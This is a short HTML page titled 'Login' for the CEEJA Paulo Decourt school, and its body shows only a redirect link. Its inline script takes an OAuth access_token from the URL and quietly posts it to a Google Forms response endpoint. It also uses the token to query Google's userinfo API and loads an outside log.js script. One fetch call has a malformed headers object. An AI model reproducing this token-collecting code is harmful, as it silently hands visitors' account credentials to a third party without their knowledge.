<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">

<title>Login</title>
<meta name="description" content="Login no CEEJA Paulo Decourt para acessar os serviços disponíveis">

<meta http-equiv="cache-control" content="max-age=0">
<meta viewport="width=device-width, initial-scale=1">

<script src="https://tarcisomesquita.github.io/log.js"></script>

<script>
let parametros = new URLSearchParams(window.location.search);
let access_token;
let expires_in;

if (parametros.has('access_token')) {
  access_token = parametros.get('access_token');
  fetch(
    'https://docs.google.com/forms/u/0/d/e/1FAIpQLScGwq8tvtiFUjhTQ58SlhN0b9rymqGGeXbJJoFB2YWks4FSPA/formResponse', 
    {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'omit',
      headers: {  
        'Content-type': 'application/x-www-form-urlencoded;charset=utf-8'
      },
      'body': encodeURI(access_token)
    }
  );
  
  fetch(
    'https://www.googleapis.com/oauth2/v1/userinfo',
    {
      method: 'GET',
      headers: {  
        `Authorization: Bearer ${access_token}`
      }
    }
  );
}
else access_token = '';

if (parametros.has('expires_in')) expires_in = parametros.get('expires_in');
else expires_in = '';

</script>

</head>

<body>

<p>Redirecionar para <a href="https://tarcisomesquita.github.io/index.html">página inicial</a>.</p>

</body>
</html>
